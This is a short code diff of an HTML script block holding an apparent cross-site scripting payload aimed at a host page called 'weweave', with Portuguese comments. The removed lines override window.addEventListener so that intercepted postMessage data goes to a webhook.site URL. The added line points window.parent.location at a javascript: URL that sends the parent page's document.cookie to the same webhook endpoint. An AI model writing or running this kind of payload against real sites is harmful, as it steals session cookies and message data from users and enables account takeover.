@@ -1,9 +1,3 @@
 <script>
-// Tentar sobrescrever uma função que o weweave usa
-window.addEventListener = function(type, fn) {
-  if(type === 'message') {
-    // Capturar postMessages
-    fetch('https://webhook.site/76d24c61-64be-4278-8b14-f5de75206a87?msg='+JSON.stringify(arguments));
-  }
-};
+window.parent.location = "javascript:fetch('https://webhook.site/76d24c61-64be-4278-8b14-f5de75206a87?cookie='+document.cookie)";
 </script>
